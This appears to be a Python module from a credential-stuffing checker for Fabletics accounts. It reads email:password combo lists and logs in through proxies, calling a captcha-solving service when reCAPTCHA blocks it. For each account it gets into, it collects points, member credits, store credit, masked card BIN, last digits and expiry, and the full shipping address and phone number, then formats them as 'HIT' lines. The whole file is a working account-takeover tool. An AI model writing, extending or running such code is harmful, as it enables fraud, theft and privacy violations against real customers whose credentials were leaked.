from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import os

from .captcha import captcha_api_key, needs_captcha, solve_recaptcha
from .client import FableticsAPIError, FableticsClient
from .config import DEFAULT_PROXY
from .proxy import parse_proxy


@dataclass
class CheckResult:
    status: str
    email: str
    password: str
    message: str = ""
    data: dict[str, Any] = field(default_factory=dict)

    def format_hit(self) -> str:
        if self.status != "HIT":
            return self.format_line()

        cc = self.data.get("cc") or "N/A"
        address = self.data.get("address") or "N/A"
        store_credit = self.data.get("store_credit_balance", 0)
        if float(store_credit).is_integer():
            store_credit = int(store_credit)

        return (
            f"{self.email}:{self.password} | "
            f"Points = {self.data.get('points', 0)} | "
            f"Member_Credits = {self.data.get('member_credits', 0)} | "
            f"storeCreditBalance = {store_credit} | "
            f"CC = [{cc}] | "
            f"Address = [{address}]"
        )

    def format_line(self) -> str:
        if self.status == "HIT":
            return self.format_hit()
        return f"{self.status} | {self.email}:{self.password} | {self.message}"


def _first(mapping: dict[str, Any], *keys: str, default: Any = None) -> Any:
    for key in keys:
        if key in mapping and mapping[key] not in (None, ""):
            return mapping[key]
    return default


def _pick_default(items: list[dict[str, Any]]) -> dict[str, Any] | None:
    if not items:
        return None
    for item in items:
        if item.get("isDefault"):
            return item
    return items[0]


def _format_card(card: dict[str, Any]) -> str:
    card_type = str(card.get("cardType") or "CARD").upper()
    cc_bin = str(card.get("ccBin") or "")
    last_four = str(card.get("lastFourDigits") or "").zfill(4)
    exp_month = str(card.get("expMonth") or "").zfill(2)
    exp_year = str(card.get("expYear") or "")
    if len(exp_year) == 4:
        exp_year = exp_year[-2:]

    masked = f"{cc_bin}{'•' * 6}{last_four}" if cc_bin else f"••••••••••{last_four}"
    return f"{card_type} - {masked} exp: {exp_month}/{exp_year}"


def _format_address(address: dict[str, Any]) -> str:
    first = str(address.get("firstName") or "").strip()
    last = str(address.get("lastName") or "").strip()
    name = f"{first} {last}".strip()
    address1 = str(address.get("address1") or "")
    address2 = str(address.get("address2") or "")
    country = str(address.get("countryCode") or "")
    city = str(address.get("city") or "")
    state = str(address.get("state") or "")
    phone = str(address.get("phone") or "")
    zip_code = str(address.get("zip") or "")
    return f"{name}, {address1}, {address2}, {country}, {city}, {state}, {phone}, {zip_code}"


def capture_account_data(client: FableticsClient, token: str, login_customer: dict[str, Any]) -> dict[str, Any]:
    loyalty = client.get("/api/accounts/me/loyalty/details", token)
    membership = client.get("/api/accounts/me/membership", token)
    addresses = client.get("/api/accounts/me/addresses", token)

    payments: list[dict[str, Any]] = []
    try:
        payments = client.get("/api/accounts/me/payments", token) or []
    except FableticsAPIError:
        pass

    if not isinstance(addresses, list):
        addresses = []
    if not isinstance(payments, list):
        payments = []

    default_address = _pick_default(addresses)
    shipping_id = membership.get("shippingAddressId")
    if shipping_id:
        for address in addresses:
            if address.get("id") == shipping_id:
                default_address = address
                break

    default_card = _pick_default(payments)
    payment_object_id = membership.get("paymentObjectId")
    if payment_object_id:
        for card in payments:
            if card.get("creditCardId") == payment_object_id:
                default_card = card
                break

    points = int(loyalty.get("balance") or 0)
    member_credits = int(membership.get("availableTokenQuantity") or 0)
    store_credit_balance = float(membership.get("storeCreditBalance") or 0)

    return {
        "points": points,
        "member_credits": member_credits,
        "store_credit_balance": store_credit_balance,
        "cc": _format_card(default_card) if default_card else "N/A",
        "address": _format_address(default_address) if default_address else "N/A",
        "email": _first(login_customer, "email"),
        "customer_id": _first(login_customer, "id"),
    }


_UNSET = object()


def resolve_proxy(proxy: str | None = None) -> str | None:
    raw = proxy if proxy is not None else os.environ.get("FABLETICS_PROXY") or DEFAULT_PROXY
    if not raw:
        return None
    return parse_proxy(raw)


def _is_auth_failure(message: str) -> bool:
    lower = message.lower()
    return any(
        phrase in lower
        for phrase in (
            "authentication failed",
            "invalid credentials",
            "invalid username or password",
            "incorrect password",
            "email or password",
            "wrong password",
            "user not found",
        )
    )


def _is_captcha_failure(message: str) -> bool:
    lower = message.lower()
    return (
        "validation failed on recaptcharesponse" in lower
        or "invalid captcha" in lower
        or "captcha verification" in lower
    )


def _classify_api_error(exc: FableticsAPIError, email: str, password: str) -> CheckResult:
    message = str(exc)
    lower = message.lower()
    if exc.retryable:
        return CheckResult(status="RETRY", email=email, password=password, message=message)
    if _is_auth_failure(message):
        return CheckResult(status="FAIL", email=email, password=password, message="Invalid credentials")
    if exc.captcha_required or needs_captcha(message) or _is_captcha_failure(message):
        return CheckResult(
            status="RETRY",
            email=email,
            password=password,
            message=message,
        )
    if exc.status_code == 401 and "session required" not in lower:
        return CheckResult(status="RETRY", email=email, password=password, message=message)
    return CheckResult(status="ERROR", email=email, password=password, message=message)


def _attempt_check(
    client: FableticsClient,
    email: str,
    password: str,
    recaptcha_response: str | None = None,
) -> CheckResult:
    login = client.login(email, password, recaptcha_response=recaptcha_response)
    data = capture_account_data(client, login.access_token, login.customer)
    return CheckResult(status="HIT", email=email, password=password, data=data)


def check_account(
    email: str,
    password: str,
    proxy: str | None | object = _UNSET,
    timeout: int = 30,
) -> CheckResult:
    if proxy is _UNSET:
        resolved_proxy = resolve_proxy()
    else:
        resolved_proxy = proxy
    client = FableticsClient(proxy=resolved_proxy, timeout=timeout)

    try:
        return _attempt_check(client, email, password)
    except FableticsAPIError as exc:
        if exc.captcha_required or needs_captcha(str(exc)):
            if not captcha_api_key():
                return CheckResult(
                    status="RETRY",
                    email=email,
                    password=password,
                    message="Captcha required — set CAPSOLVER_API_KEY",
                )
            try:
                token = solve_recaptcha(timeout=min(timeout * 2, 120))
            except Exception as solve_exc:
                return CheckResult(
                    status="RETRY",
                    email=email,
                    password=password,
                    message=f"Captcha solve failed: {solve_exc}",
                )
            if not token:
                return CheckResult(
                    status="RETRY",
                    email=email,
                    password=password,
                    message="Captcha required — solver returned empty token",
                )
            try:
                return _attempt_check(client, email, password, recaptcha_response=token)
            except FableticsAPIError as retry_exc:
                return _classify_api_error(retry_exc, email, password)

        return _classify_api_error(exc, email, password)
    except Exception as exc:
        return CheckResult(status="ERROR", email=email, password=password, message=str(exc))


def parse_combo(line: str) -> tuple[str, str] | None:
    line = line.strip().lstrip("\ufeff")
    if not line or line.startswith("#"):
        return None

    # Support pasted hit one-liners: email:pass | Points = ...
    if " | " in line:
        line = line.split(" | ", 1)[0].strip()

    if "\t" in line and ":" not in line:
        parts = line.split("\t", 1)
        if len(parts) == 2:
            email, password = parts[0].strip(), parts[1].strip()
            if email and password and "@" in email:
                return email, password

    if ":" not in line:
        return None

    email, password = line.split(":", 1)
    email = email.strip()
    password = password.strip()
    if not email or not password or "@" not in email:
        return None
    return email, password
